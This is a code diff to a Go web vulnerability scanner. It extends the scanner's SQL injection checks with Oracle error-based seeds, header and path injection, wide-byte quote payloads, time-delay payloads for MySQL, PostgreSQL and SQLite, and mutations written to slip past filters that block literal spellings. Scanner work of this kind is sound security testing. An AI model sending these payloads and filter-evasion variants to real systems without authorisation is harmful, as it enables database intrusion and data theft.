@@ -12,6 +12,7 @@ package active
 import (
 	"context"
 	"html"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
@@ -49,6 +50,17 @@ func init() {
 	checks.Register(graphqlIntrospection{})
 	checks.Register(cachePoisoning{})
 	checks.Register(domXSS{})
+	checks.Register(prototypePollution{})
+	checks.Register(csti{})
+	checks.Register(pathOverride{})
+	checks.Register(ipSpoof{})
+	checks.Register(httpPut{})
+	checks.Register(corsOrigin{})
+	checks.Register(exposedPath{})
+	checks.Register(jsonp{})
+	checks.Register(contentTypeBypass{})
+	checks.Register(refererBypass{})
+	checks.Register(webSocketOrigin{})
 	checks.Register(xxe{})
 	checks.Register(jwt{})
 	checks.Register(csrf{})
@@ -90,10 +102,25 @@ var sqlErrorSignatures = []string{
 	"unrecognized token",
 	"psycopg2",
 	"sqlalchemy.exc",
-	"ora-0",
+	// Every Oracle error carries an `ORA-nnnnn` code, and the five digits are not
+	// predictable: `ORA-00933` and `ORA-01756` are syntax, `ORA-29257` is the one
+	// an out-of-band function raises. Matching the prefix is what covers them.
+	"ora-",
 	"oracle error",
 	"invalid query",
 	"jdbc",
+	// The messages the engines actually print today. The older spellings above are what a
+	// driver's own wrapper produces, and a server that answers with its own words says one of
+	// these: PostgreSQL names the position of the syntax error, SQL Server does the same for a
+	// near-miss, MySQL names the column or table it could not find.
+	"syntax error at or near",
+	"incorrect syntax near",
+	"unknown column",
+	"doesn't exist",
+	"does not exist",
+	"no such table",
+	"invalid object name",
+	"division by zero",
 }
 
 // sqlErrorSeeds break the syntax of whatever statement the parameter is
@@ -113,6 +140,10 @@ var sqlErrorSeeds = []string{
 	"1 AND 1=CONVERT(int, @@version)",
 	"' AND extractvalue(1,concat(0x7e,version()))-- -",
 	"' AND updatexml(1,concat(0x7e,user()),1)-- -",
+	// Oracle has no error-based function in the MySQL sense; what names it is a
+	// call that raises its own error, and the code in the message is the proof.
+	"' AND 1=utl_inaddr.get_host_address('crackweb.invalid')-- -",
+	"' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -",
 	"';SELECT 1/0-- -",
 
 	// ORDER BY and LIMIT take an expression but not a quoted string, and no
@@ -157,6 +188,15 @@ func (sqliError) Run(ctx context.Context, c *checks.Context, t *checks.Target) [
 			return firstNewSignature(strings.ToLower(string(resp.Body)), baseline, sqlErrorSignatures) != ""
 		})
 	if err != nil || attempt == nil {
+		// Nothing came back through a parameter. A header is a value the caller writes freely,
+		// and an application that records one — the visitor's address, the agent, the referring
+		// page — has a query built from it that no parameter check can reach.
+		if f := sqlErrorHeaderInjection(ctx, c, t, baseline); f != nil {
+			return []*finding.Finding{f}
+		}
+		if f := sqlErrorPathInjection(ctx, c, t, baseline); f != nil {
+			return []*finding.Finding{f}
+		}
 		return nil
 	}
 
@@ -196,6 +236,52 @@ func variantNote(c *checks.Context, attempt *checks.Attempt) string {
 var sqlReferences = []string{
 	"https://owasp.org/www-community/attacks/SQL_Injection",
 	"https://cwe.mitre.org/data/definitions/89.html",
+}
+
+// booleanMutations are the transformations applied to a confirmation pair.
+//
+// Each changes the bytes without changing what the database reads, which is the
+// only kind of change that leaves the pair comparable. A rule written to match
+// `' AND '1'='1` does not match the widened quote, the comment-wrapped space, the
+// split keyword or the alternating case — and the statement means the same thing
+// in all five spellings.
+var booleanMutations = []string{
+	"space-to-comment",
+	"keyword-split-and",
+	"case-swap",
+}
+
+// booleanMutatedFamilies returns the confirmation pairs again, with every value
+// rewritten by booleanMutations.
+//
+// The plain families are sent as written, so a target that filters nothing is
+// covered by them; these exist for the target that has learned the literal
+// spellings. Only the first two families are used as the base: they are the
+// string and the numeric context, and the rest are further spellings of the same
+// two shapes, whose mutations would send the same requests again.
+func booleanMutatedFamilies() []booleanFamily {
+	var out []booleanFamily
+	for _, base := range booleanFamilies[:2] {
+		for _, name := range booleanMutations {
+			mutator, ok := payload.MutatorByName(name)
+			if !ok {
+				continue
+			}
+			mutated := booleanFamily{
+				name:     base.name + " + " + mutator.Name,
+				anchored: base.anchored,
+				encoded:  mutator.ProducesEncoded,
+			}
+			for _, value := range base.trueValues {
+				mutated.trueValues = append(mutated.trueValues, mutator.Apply(value))
+			}
+			for _, value := range base.falseValues {
+				mutated.falseValues = append(mutated.falseValues, mutator.Apply(value))
+			}
+			out = append(out, mutated)
+		}
+	}
+	return out
 }
 
 // sqliBoolean detects boolean-based blind SQL injection by sending a condition
@@ -251,7 +337,10 @@ func (sqliBoolean) Passive() bool { return false }
 // It also subsumes reproducibility: a page that varies on its own will not
 // return the same thing for two true conditions either, so unstable targets drop
 // out without a separate round of repeat requests.
-var booleanFamilies = []struct {
+// booleanFamily is one confirmation pair: two conditions that have to agree with
+// each other and with the baseline, and two that have to agree with each other
+// and differ from it.
+type booleanFamily struct {
 	name        string
 	trueValues  []string
 	falseValues []string
@@ -259,7 +348,13 @@ var booleanFamilies = []struct {
 	// baseline. Only the AND forms are, because only they narrow the result set
 	// back to what the original query returned.
 	anchored bool
-}{
+	// encoded marks a family whose values are already in transport form, which is
+	// what a transformation like the widened quote produces: encoding it again
+	// would deliver a literal percent sequence instead of the byte it stands for.
+	encoded bool
+}
+
+var booleanFamilies = []booleanFamily{
 	{
 		name:        "AND",
 		trueValues:  []string{"' AND '1'='1", "' AND '2'='2"},
@@ -292,6 +387,26 @@ var booleanFamilies = []struct {
 		name:        "OR, double quotes",
 		trueValues:  []string{`" OR "1"="1"-- -`, `" OR "2"="2"-- -`},
 		falseValues: []string{`" OR "1"="2"-- -`, `" OR "3"="4"-- -`},
+	},
+	// The widened quote, written out in transport form.
+	//
+	// It cannot be a mutation of the families above: on a GBK connection only the
+	// first `0xdf 0x5c` pair is swallowed as one character, so a payload whose
+	// quoting is spread over several literals (`' AND '1'='1`) comes out
+	// unbalanced, while a single widened quote followed by a numeric condition and
+	// a comment terminator is a well-formed statement. These two families are that
+	// shape, spelled the way the transformation spells it.
+	{
+		name:        "OR, wide byte",
+		encoded:     true,
+		trueValues:  []string{"%df%27+OR+1%3D1--+-", "%df%27+OR+2%3D2--+-"},
+		falseValues: []string{"%df%27+OR+1%3D2--+-", "%df%27+OR+3%3D4--+-"},
+	},
+	{
+		name:        "AND, wide byte",
+		encoded:     true,
+		trueValues:  []string{"%df%27+AND+1%3D1--+-", "%df%27+AND+2%3D2--+-"},
+		falseValues: []string{"%df%27+AND+1%3D2--+-", "%df%27+AND+3%3D4--+-"},
 	},
 }
 
@@ -362,7 +477,11 @@ func (sqliBoolean) Run(ctx context.Context, c *checks.Context, t *checks.Target)
 		prefix = "1"
 	}
 
-	for _, family := range booleanFamilies {
+	families := make([]booleanFamily, 0, len(booleanFamilies)+len(booleanMutatedFamilies()))
+	families = append(families, booleanFamilies...)
+	families = append(families, booleanMutatedFamilies()...)
+
+	for _, family := range families {
 		// baseUnder returns the baseline fingerprinted the way a branch is: with the
 		// branch's own restore list. Applying the restore to one side of a comparison
 		// only is what turns page text the application wrote for its own reasons into
@@ -373,6 +492,21 @@ func (sqliBoolean) Run(ctx context.Context, c *checks.Context, t *checks.Target)
 
 		probe := func(suffix string) (booleanBranch, *httpmsg.Request, bool) {
 			value := prefix + suffix
+			if family.encoded {
+				// The values are already in transport form, so the parameter's own
+				// value has to be put into that form too, and the whole thing is
+				// sent verbatim.
+				value = url.QueryEscape(prefix) + suffix
+				request, response, err := c.InjectEncoded(ctx, t, value, checks.EncodeNone)
+				if err != nil || request == nil || response == nil {
+					return booleanBranch{}, nil, false
+				}
+				if response.Status >= 400 {
+					return booleanBranch{}, nil, false
+				}
+				fp := c.Fingerprint(response, echoRestore(value, t.Param.Value)...)
+				return booleanBranch{value: value, response: response, fp: fp}, request, true
+			}
 			request, response, err := c.Inject(ctx, t, value)
 			if err != nil || request == nil || response == nil {
 				return booleanBranch{}, nil, false
@@ -482,6 +616,38 @@ var sqliTimingSuffixes = []struct {
 	{"' AND (SELECT 1)>0 WAITFOR DELAY '0:0:5'--", 5 * time.Second},
 	{"' AND 1=(SELECT 1) AND 1=1 WAITFOR DELAY '0:0:5'--", 5 * time.Second},
 	{"' AND pg_sleep(5)-- -", 5 * time.Second},
+	// MySQL's other way to burn time. A target that blocks the word SLEEP — or
+	// that runs it through a filter which strips the function — still evaluates a
+	// benchmark, because it is an ordinary expression rather than a delay
+	// primitive. Twenty million MD5s is several seconds on any real machine.
+	{"' AND BENCHMARK(20000000,MD5(1))-- -", 5 * time.Second},
+
+	// The same delays with no quote in front, for a parameter interpolated as a
+	// number. Every seed above opens with a quote, and a quote in a numeric
+	// position is a syntax error the database answers instantly — which is why a
+	// numeric time-based injection was invisible to this check. Measured on a
+	// real target: `1 AND SLEEP(5)` delayed five seconds where `1' AND SLEEP(5)`
+	// returned in a millisecond with a syntax error.
+	{" AND SLEEP(5)-- -", 5 * time.Second},
+	{" AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -", 5 * time.Second},
+	{" AND pg_sleep(5)-- -", 5 * time.Second},
+	{" AND BENCHMARK(20000000,MD5(1))-- -", 5 * time.Second},
+
+	// ORDER BY and LIMIT take an expression but not a quoted string, so none of the seeds above
+	// reaches them: a quote there is a syntax error and a bare `AND` has nothing to attach to.
+	// These append another term to the list the caller already supplied — the position accepts a
+	// comma-separated one — and the delay rides inside it as a subquery, which is an ordinary
+	// expression there. Measured on a real target: `desc,(SELECT SLEEP(5))` paused five seconds
+	// where `desc,(SELECT 1)` came back in a millisecond.
+	{",(SELECT SLEEP(5))", 5 * time.Second},
+	{"1,(SELECT SLEEP(5))", 5 * time.Second},
+	{",(SELECT BENCHMARK(20000000,MD5(1)))", 5 * time.Second},
+	{",(SELECT pg_sleep(5))", 5 * time.Second},
+	// SQLite has no sleep primitive, so the delay has to be work: two hundred
+	// megabytes of random bytes, hex-encoded and compared by LIKE. The statement
+	// stays valid, and the pause it buys is a few seconds — hence the smaller
+	// expectation, which keeps a fast machine from reading as "no delay".
+	{" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000))))", 3 * time.Second},
 }
 
 // timingBudget is how long a request that is meant to make the server wait is
@@ -544,22 +710,38 @@ func (sqliTime) Run(ctx context.Context, c *checks.Context, t *checks.Target) []
 	}
 	c.ProbeWAF(ctx, t)
 
+	// The suffixes are walked together per pause length. Sent one at a time, each spelling paid
+	// for the mutation engine's whole escalation — its own first generation, then the mutations
+	// of it — before the next was tried, so a target that never pauses cost a walk per spelling.
+	// Grouped, the first generation of every spelling with the same pause goes out before any
+	// mutation, which is both the order that finds a working spelling soonest and the one that
+	// stops once it does. The grouping is by pause because the measurement that follows has to
+	// know how long the target was told to wait.
+	byDelay := map[time.Duration][]string{}
+	var delays []time.Duration
 	for _, candidate := range sqliTimePayloadsFor(t.Param.Value) {
+		if _, seen := byDelay[candidate.delay]; !seen {
+			delays = append(delays, candidate.delay)
+		}
+		byDelay[candidate.delay] = append(byDelay[candidate.delay], candidate.payload)
+	}
+
+	for _, delay := range delays {
 		// Every request in this check is meant to take as long as it asked for,
 		// and possibly longer: a server under load overruns its own delay, and
 		// the exchange is cut off before the answer arrives if the deadline is
 		// the client's ordinary one. That failure is indistinguishable from a
 		// target that did not pause, so the finding disappears silently.
-		budget := timingBudget(candidate.delay)
+		budget := timingBudget(delay)
 
 		// The mutation engine finds a wording the target's filter lets through;
 		// a cheap single-shot comparison decides whether it is worth measuring.
-		attempt, err := c.SendVariantsTimed(ctx, t, payload.SQLi, "sqli-time", []string{candidate.payload},
+		attempt, err := c.SendVariantsTimed(ctx, t, payload.SQLi, "sqli-time", byDelay[delay],
 			func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
 				// Deliberately permissive: a quarter of the requested pause is
 				// enough to justify the requests a real measurement costs. The
 				// strict verdict comes next.
-				return resp.Duration >= candidate.delay/4
+				return resp.Duration >= delay/4
 			}, budget)
 		if err != nil || attempt == nil {
 			continue
@@ -575,7 +757,7 @@ func (sqliTime) Run(ctx context.Context, c *checks.Context, t *checks.Target) []
 		if err != nil {
 			continue
 		}
-		verdict := checks.JudgeTiming(baseline, injected, candidate.delay)
+		verdict := checks.JudgeTiming(baseline, injected, delay)
 		if !verdict.Delayed {
 			continue
 		}
